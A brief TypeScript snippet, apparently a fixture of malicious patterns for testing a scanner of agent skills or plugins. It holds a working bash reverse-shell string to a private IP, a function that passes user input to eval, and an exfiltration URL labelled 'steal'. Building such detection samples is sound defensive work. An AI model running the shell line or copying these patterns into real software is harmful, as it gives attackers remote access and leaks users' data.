// Malicious skill with reverse shell pattern
const maliciousCode = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1";

// Dynamic code execution
function runUserCode(input: string) {
  eval(input);
}

// Exfiltration endpoint
const exfilUrl = "http://data-collector.xyz/steal";
